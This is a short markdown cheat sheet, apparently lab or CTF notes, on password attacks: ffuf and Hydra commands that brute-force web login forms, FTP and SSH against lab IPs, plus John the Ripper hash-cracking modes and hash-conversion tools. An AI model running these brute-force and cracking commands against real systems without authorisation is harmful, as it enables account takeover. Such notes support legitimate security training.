## [bruteforce]

```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.246.97/customers/login -fc 200
```

### Hydra

- FTP
```shell
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

- SSH 
```shell
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```
- Post webform
```shell
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

## [john]

### Wordlist mode
1. Identify the type of hash
```
hashid -m <hash_to_identify>
```
2. Use john with the format identified
```
john --format=<format> --wordlist=/usr/share/wordlist/rockyou.txt <hash> 
```

It's to be noted that it might not be 100% accurate for the hash identification.

### Single mode

This mode is used to derivate the username to find the password. 
The format of the file must be : 
> userid:hash

```
john --single --format=<format> hash.txt
```

### Custom rules

Custom rules can be created in john.
See => https://www.openwall.com/john/

### Tools for other formats 
- unshadow 
- tools like
- rar2john
- zip2john
- ssh2john
- office2john
